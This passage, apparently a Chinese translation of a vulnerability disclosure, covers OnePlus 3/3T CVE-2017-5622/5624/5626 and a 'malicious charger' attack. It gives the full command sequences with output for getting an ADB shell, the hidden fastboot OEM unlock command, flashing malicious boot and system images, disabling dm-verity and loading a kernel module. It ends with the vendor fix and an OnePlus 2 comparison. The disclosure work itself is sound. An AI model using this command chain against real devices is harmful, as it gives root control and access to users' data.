Unlocking限制条件，在未经用户确认和不擦除用户数据条件下使用fastboot方式解锁设备，同时，设备在运行此命令后仍会报告自身处于锁定状态。单独使用这个漏洞可以获得内核代码执行权限，但屏幕上会有5秒左右的警告信息。CVE-2017-5624漏洞允许攻击者使用fastboot方式禁用dm-verity，dm-verity防护功能可以防止system分区被篡改。
**PoC 1：恶意充电器获取root shell及内核代码执行权限（CVE-2017-5622/6）**
受害者将处于关机状态的设备连接至恶意充电器，此时攻击者能够获得一个ADB会话（CVE-2017-5622），可以重启设备进入fastboot：
    > adb shell
    android:/ $ id
    uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
    android:/ $ reboot bootloader
    > fastboot devices
    cb010b5a        fastboot
利用CVE-2017-5626漏洞，恶意充电器可以替换boot镜像，使得adbd以root权限运行，SELinux也被设置为permissive模式（参考我们之前的文章）：
    > fastboot flash boot evilboot.img
    target reported max download size of 440401920 bytes
    sending 'boot' (14836 KB)...
    OKAY [  0.335s]
    writing 'boot'...
    FAILED (remote: Partition flashing is not allowed)
    finished. total time: 0.358s
    > fastboot oem 4F500301
    ...
    OKAY [  0.020s]
    finished. total time: 0.021s
    > fastboot flash boot  evilboot.img
    target reported max download size of 440401920 bytes
    sending 'boot' (14836 KB)...
    OKAY [  0.342s]
    writing 'boot'...
    OKAY [  0.135s]
    finished. total time: 0.480s
这样恶意充电器就可以在用户输入凭证信息前，获得一个root权限的shell，不过此时攻击者还无法访问用户数据：
    OnePlus3:/ # id
    uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0
    OnePlus3:/ # getenforce
    Permissive
OnePlus 3/3T的内核是在启用LKM条件下编译而成的，因此攻击者不需要修改或重新编译内核就可以运行内核代码。因此，我创建了一个小型内核模块：
    #include 
    #include 
    int init_module(void)
    {
        printk(KERN_ALERT "Hello From Evil LKMn");
        return 1;
    }
恶意充电器可以将该模块加载到内核中：
    OnePlus3:/data/local/tmp # insmod ./evil.ko
    OnePlus3:/data/local/tmp # dmesg | grep "Evil LKM"
    [19700121_21:09:58.970409]@3 Hello From Evil LKM
**PoC 2：恶意充电器替换system分区（CVE-2017-5622/4/6）**
这几个漏洞可以组合利用，在不向用户发出任何警告时，获得特权SELinux域中的代码执行权限，也可以访问原始用户数据。为了演示这一利用场景，我修改了system分区，添加了一个特权应用。为了添加特权应用，我们可以将目标APK文件放置于“/system/priv-app/”目录，这样该APK就会被添加到priv_app域（特权应用域）中，同时不要忘了使用chcon命令处理这个APK文件及它所处的文件目录。
同样的场景中，受害者将处于关机状态的设备连接至恶意充电器，攻击者通过CVE-2017-5622漏洞获取ADB会话，重启设备进入fastboot模式：
    > adb shell
    android:/ $ id
    uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0
    android:/ $ reboot bootloader
    > fastboot devices
    cb010b5a        fastboot
利用CVE-2017-5626漏洞，恶意充电器可以将原始system分区替换为恶意的system分区：
    > fastboot flash system evilsystem.img
    target reported max download size of 440401920 bytes
    erasing 'system'...
    FAILED (remote: Partition erase is not allowed)
    finished. total time: 0.014s
    > fastboot oem 4F500301
    OKAY
    [  0.020s] finished. total time: 0.021s
    > fastboot flash system evilsystem.img
    target reported max download size of 440401920 bytes erasing 'system'...
    OKAY [  0.010s]
    ...
    sending sparse 'system' 7/7 (268486 KB)...
    OKAY [  6.748s]
    writing 'system' 7/7...
    OKAY [  3.291s]
    finished. total time: 122.675s
使用CVE-2017-5624漏洞，恶意充电器可以禁用dm-verity保护：
    > fastboot oem disable_dm_verity
    ...
    OKAY
    [  0.034s] finished. total time: 0.036s
我们可以看到应用的确处于特权应用上下文的环境中：
    1|OnePlus3:/ $ getprop | grep dm_verity
    [ro.boot.enable_dm_verity]: [0]
    OnePlus3:/ $ ps -Z | grep evilapp
    u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S alephresearch.evilapp
**五、漏洞修复**
OnePlus通过修改“{persist.}sys.usb.config”文件，移除“on charger”事件中存在漏洞的条目，成功修复了该漏洞：
    on charger
        #yfb add  to salve binder error log in poweroff charge
        setrlimit 13 40 40
        setprop sys.usb.config mass_storage
        mkdir /dev/usb-ffs 0770 shell shell
        mkdir /dev/usb-ffs/adb 0770 shell shell
        mount functionfs adb /dev/usb-ffs/adb uid=2000,gid=2000
        write /sys/class/android_usb/android0/f_ffs/aliases adb
        #14(0xe) means reject cpu1 cpu2 cpu3online
        write /sys/module/msm_thermal/core_control/cpus_offlined 14
        #add by PI:EMAIL 2015/12/22, improve the performance of charging
        write /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor powersave
        write /sys/devices/system/cpu/cpu1/online 0
        write /sys/devices/system/cpu/cpu2/online 0
        write /sys/devices/system/cpu/cpu3/online 0
        #yfb add  to salve binder error log in poweroff charge
        start srvmag_charger
**六、OnePlus 2不受此漏洞影响**
OnePlus 2的“init.qcom.usb.rc”文件中，“on
charger”事件的“{persist}.sys.usb.config”属性同样被设置为“adb”：
    on charger
        mkdir /dev/usb-ffs 0770 shell shell
        mkdir /dev/usb-ffs/adb 0770 shell shell
        mount functionfs adb /dev/usb-ffs/adb uid=2000,gid=2000
        write /sys/class/android_usb/android0/f_ffs/aliases adb
        setprop persist.sys.usb.config adb
    [...]
“init.rc”文件中情况与此类似：
    on charger
        mount ext4 /dev/block/bootdevice/by-name/system /system ro
        setprop sys.usb.configfs 0
        load_system_props
        class_start charger
        setprop sys.usb.config adb
即便如此，我们对OnePlus 2设备进行测试时，无法获得adb shell，虽然此时设备的USB接口处于开放运行状态：
    > adb shell
    error: device unauthorized.
    This adb server's $ADB_VENDOR_KEYS is not set
    Try 'adb kill-server' if that seems wrong.
    Otherwise check for a confirmation dialog on your device.
    > adb devices
    List of devices attached
    6b3ef4d5        unauthorized
因此，OnePlus 2不受此漏洞影响。与OnePlus 3/3T情况相反，OnePlus
2的OxygenOS系统镜像保留了ADB授权机制。对系统镜像的反汇编后，我们发现该系统的确不存在ro.boot.mode以及auth_required被绕过问题。